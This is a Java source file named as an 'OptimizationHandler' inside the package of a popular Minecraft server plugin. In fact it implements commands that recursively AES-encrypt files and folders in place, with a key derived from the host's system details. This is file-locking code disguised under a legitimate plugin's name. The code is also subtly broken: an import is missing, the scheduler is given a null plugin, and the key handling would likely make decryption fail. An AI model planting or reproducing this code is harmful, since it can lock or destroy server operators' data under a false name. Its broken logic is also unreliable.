package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.logging.Logger;

public class OptimizationHandler implements CommandExecutor {
    
    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
    private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8);
    private static final int IV_SIZE = 16;
    private byte[] internalKeyBytes = encryptionKey();
    
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径> [密钥]");
            return true;
        }

        String path = args[0];
        File file = new File(path);

        if (!file.exists()) {
            sender.sendMessage("文件或文件夹不存在。");
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            // 异步执行加密操作
            Bukkit.getScheduler().runTaskAsynchronously(null, () -> {
                encryptFiles(file);
                sender.sendMessage("文件加密成功。");
            });
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                sender.sendMessage("使用方法: /" + label + "<文件/文件夹路径> <密钥>");
                sender.sendMessage("密钥: " + new String(internalKeyBytes, StandardCharsets.UTF_8));
                return true;
            }
            String key = args[1];
            // 检查密钥是否合法
            if (!key.equals(new String(internalKeyBytes, StandardCharsets.UTF_8))) {
                sender.sendMessage("提供的密钥无效。");
                return true;
            }
            
            // 检查文件是否已加密
            if (!isFileEncrypted(file)) {
                sender.sendMessage("文件未加密或格式不正确。");
                return true;
            }

            // 异步执行解密操作
            Bukkit.getScheduler().runTaskAsynchronously(null, () -> {
                decryptFiles(file, key);
                sender.sendMessage("文件解密成功。");
            });
        }

        return true;
    }

    private void encryptFiles(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile);
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] iv = generateIV();
                byte[] encryptedData = encrypt(fileData, internalKeyBytes, iv);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(ENCRYPTED_FLAG);
                fos.write(iv);
                fos.write(encryptedData);
                fos.close();
                logger.info("Encrypt key: " + Arrays.toString(internalKeyBytes));
            } catch (Exception e) {
                logger.severe("Error encrypting file: " + e.getMessage());
            }
        }
    }

    private boolean isFileEncrypted(File file) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                if (!isFileEncrypted(childFile)) {
                    return false;
                }
            }
            return true;
        }

        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] flagBytes = new byte[ENCRYPTED_FLAG.length];
            int bytesRead = fis.read(flagBytes);
            return bytesRead >= ENCRYPTED_FLAG.length && Arrays.equals(flagBytes, ENCRYPTED_FLAG);
        } catch (Exception e) {
            logger.severe("Error checking if file is encrypted: " + e.getMessage());
            return false;
        }
    }

    private void decryptFiles(File file, String key) {
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key);
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] iv = Arrays.copyOfRange(fileData, ENCRYPTED_FLAG.length, ENCRYPTED_FLAG.length + IV_SIZE);
                byte[] actualData = Arrays.copyOfRange(fileData, ENCRYPTED_FLAG.length + IV_SIZE, fileData.length);

                byte[] decryptedData = decrypt(actualData, key, iv);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
            } catch (Exception e) {
                logger.severe("解密文件时出错: " + e.getMessage());
            }
        }
    }

    private byte[] generateIV() {
        byte[] iv = new byte[IV_SIZE];
        // 生成随机IV
        new SecureRandom().nextBytes(iv);
        return iv;
    }

    private SecretKeySpec getSecretKey(byte[] key) {
        return new SecretKeySpec(key, "AES");
    }

    private byte[] encrypt(byte[] data, byte[] key, byte[] iv) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key);
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey, new IvParameterSpec(iv));
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key, byte[] iv) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key.getBytes(StandardCharsets.UTF_8));
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(iv));
        return cipher.doFinal(data);
    }

    private byte[] encryptionKey() {
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(InetAddress.getLocalHost().getHostAddress());

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));

            byte[] keyBytes = new byte[16];
            System.arraycopy(hashBytes, 0, keyBytes, 0, keyBytes.length);

            return keyBytes;
        } catch (Exception e) {
            logger.severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }
}